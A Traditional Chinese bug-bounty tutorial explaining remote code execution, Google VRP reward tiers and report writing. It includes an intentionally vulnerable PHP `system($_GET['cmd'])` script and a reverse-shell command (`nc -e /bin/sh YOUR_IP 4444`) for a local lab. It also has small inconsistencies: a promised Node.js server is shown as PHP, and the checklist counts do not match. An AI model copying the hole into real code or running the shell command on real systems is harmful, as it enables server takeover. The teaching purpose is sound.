---
title: "RCE 是什麼：遠端程式執行漏洞與 Bug Bounty 最高獎金"
date: 2026-10-15
category: tech
type: guide
difficulty: 入門
tags: [bug-bounty, security, web-security, rce, remote-code-execution, vulnerability]
lang: zh-TW
description: "系列 5：遠端程式執行（RCE）漏洞的原理、攻擊手法、在 Bug Bounty 計畫中的獎金結構（特別是 Google VRP），以及如何在本地環境測試與撰寫報告。"
tldr: "RCE 攻擊者能在目標伺服器上執行任意程式碼，Google VRP 最高獎金 $121,212（T0/S0 + 1.2x）。本篇講解 RCE 基本概念、常見攻擊向量（命令注入、反序列化、檔案上傳），並提供可重現的測試步驟與報告範本。"
draft: false
series:
  name: "從零開始的資安獵人"
  order: 5
---

> 🌏 [English version](/posts/tech/2026-10-15-bug-bounty-zero-05-what-is-rce-en)

## TL;DR

**RCE（Remote Code Execution）是攻擊者能在目標伺服器上執行任意程式碼的漏洞，在 Bug Bounty 中常見且獎金最高。** 本篇解構 RCE 原理、攻擊手法（命令注入、不安全反序列化、檔案上傳），並分析 Google VRP 獎金表：T0/S0 RCE 基礎獎金 $101,010，品質係數後最高可達 $121,212（1.2x）。提供可重現的測試步驟（使用本地 Node.js 伺服器）與報告寫作要點。

---

## 情境

你已經完成前四篇：讀規則、理解網站原理、設定工作台、測試 XSS/IDOR。現在你想測試更深層的漏洞——RCE。然而，RCE 需要特定的程式缺陷（例如未經驗證的系統指令執行），直接在真實目標上測試既危險又可能違反規則。你需要一個安全的實驗環境來理解 RCE 如何發生、如何偵測、以及如何寫出能拿到高額獎金的報告。

---

## 問題

**錯誤 1：誤以為 RCE 必須是複雜的零日漏洞。** 事實上，許多 RCE 漏洞源於簡單的程式錯誤：例如未經過濾的使用者輸入直接傳入 `system()`、`eval()` 或 `deserialization` 函式。

**錯誤 2：沒有本地測試環境。** 你無法在筆電上模擬「伺服器執行誰的指令」的情況，導致只能靠理論學習，無法驗證 PoC。

**錯誤 3：報告只寫「發現 RCE」而不提供「如何執行指令、影響範圍、為什麼值得高額獎金」。** Google VRP 對報告品質有明確標準：缺少 PoC、影響分析或修補建議會直接降低品質係數（0.8x），將 $101,010 變成 $80,808。

---

## 解決方案：RCE 基礎 + 本地測試環境

### RCE 基礎概念

| 攻擊向量 | 常見函式/語法 | 防禦要點 |
|---|---|---|
| **命令注入** | `system()`、`exec()`、`shell_exec()`、`passthru()`、`` ` ` (反引號) | 永遠絕不使用使用者輸入作為指令參數；使用白名單或參數化 API |
| **不安全反序列化** | `unserialize()`（PHP）、`pickle.loads()`（Python）、`ObjectInputStream.readObject()`（Java） | 避免反序列化不可信資料；使用簽名或限制類別 |
| **檔案上傳漏洞** | 上傳惡意檔案（`.php`、` .jsp`）並執行 | 檢查副檔名與 MIME 類型；將上傳檔案存放在不可執行目錄 |
| **模板注入** | `eval()`、`render()`、`template.render()` | 永遠不將使用者輸入直接傳入模板引擎 |
| **原型污染**（JavaScript） | `__proto__`、`constructor.prototype` | 凍結物件原型或使用 Map 替代物件 |

**關鍵**：RCE 不一定要透過網路服務，也可能出現在 CLI 工具、桌面應用甚至 IoT 裝置上。Bug Bounty 計畫通常聚焦於網路可達的服務（Web API、網站）。

### 本地測試伺服器：簡易 PHP 命令注入範例

以下是一個極簡的測試伺服器（`vuln.php`），模擬命令注入漏洞：

```php
<?php
// vuln.php — 只綁定在 127.0.0.1，外部無法存取
if (isset($_GET['cmd'])) {
    echo "<pre>";
    // 危險：直接執行使用者輸入
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo 'Usage: ?cmd=ls 或 ?cmd=whoami';
}
?>
```

**啟動方式**（需要 PHP）：
```
php -S 127.0.0.1:8000 vuln.php
```

**測試步驟**：
1. 正常請求：`curl 'http://127.0.0.1:8000/vuln.php?cmd=ls'`
2. 惡意請求：`curl 'http://127.0.0.1:8000/vuln.php?cmd=id'` → 會顯示使用者身份
3. 嘗試反彈：`curl 'http://127.0.0.1:8000/vuln.php?cmd=nc -e /bin/sh YOUR_IP 4444'`（僅在受控環境測試）

> ⚠️ **注意**：此範例僅供教學，請在完全隔離的環境（例如虛擬機）中測試，且不得對外網目標進行未授權攻擊。

### 報告寫作要點

Google VRP 針對 RCE 設有三個等級（高/中/低），品質係數後會進一步調整：

| 等級 | 基礎獎金 | 說明 |
|---|---|---|
| **高** | $101,010 | T0/S0 RCE（核心網域、最高影響） |
| **中** | $31,337–$63,267 | T1/T2 或中等影響 |
| **低** | $1,337–$13,337 | T3b 或低影響 |

**品質係數**：0.8x（低品質）、1.0x（好品質）、1.2x（卓越品質）。

**卓越品質（1.2x）報告必備**：
- [ ] 完整重現步驟（可直接複製的 curl 指令或 Burp Repeater 步驟）
- [ ] Proof of Concept（PoC）：包含惡意輸入與預期輸出
- [ ] 影響分析：攻擊者能取得什麼權限（例如 www-data、root）、能讀取哪些檔案
- [ ] CVSS 3.1 評分與向量（例如 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`）
- [ ] 修補建議：程式碼層級（使用參數化 API）或配置層級（禁用危險函式）

---

## 為什麼會這樣：Google VRP 獎金設計邏輯

1. **影響嚴重度**：RCE 可直接導致伺服器被完全控制，進而竊取資料、安裝後門、橫向移動，因此屬於最高風險類別（S0）。
2. **業務損失**：一旦伺服器被控制，可能導致服務中斷、客戶資料外洩、品牌聲譽受損，賠償成本極高。
3. **品質係數激勵完整報告**：評審驗證 PoC 耗時；提供完整腳本與環境設定可縮短驗證時間，故給予更高倍數。

**舉例**：同個 RCE 漏洞，
- 報告品質 0.8x → $101,010 × 0.8 = $80,808
- 報告品質 1.0x → $101,010 × 1.0 = $101,010
- 報告品質 1.2x → $101,010 × 1.2 = $121,212

差額達 $40,404，僅因為報告是否完整。

---

## 自我檢查（這篇重點：你理解 RCE 與能寫好報告嗎？）

- [ ] 你能說出三種常見 RCE 攻擊向量（命令注入、反序列化、檔案上傳）
- [ ] 你知道在本地環境如何測試命令注入（使用 `system($_GET['cmd'])`）
- [ ] 你能區分 Google VRP RCE 高、中、低獎金等級
- [ ] 你知道「品質係數 1.2x」需要哪四個條件（PoC、影響、CVSS、修補建議）
- [ ] 你已寫出可直接複製執行的 PoC（例如 `curl 'http://127.0.0.1:8000/vuln.php?cmd=id'`）

---

## 參考資料

- [Google VRP Rules](https://bughunters.google.com/about/rules/google-friends/google-and-alphabet-vulnerability-reward-program-vrp-rules)
- [Google VRP 2024 July Announcement](https://bughunters.google.com/blog/increasing-google-alphabet-vrp-rewards-up-to-151515)
- [Google 2024 VRP Review](https://blog.google/security/vulnerability-reward-program-2024-in/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
- [PortSwigger — Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [Node.js child_process security risks](https://nodejs.org/api/child_process.html#child_process_safety_considerations)

---

*本篇是系列 5（RCE），前面：工作台（3）、XSS/IDOR（4）、規則（1）、網站原理（2）。下一篇：報告與分類（6）。*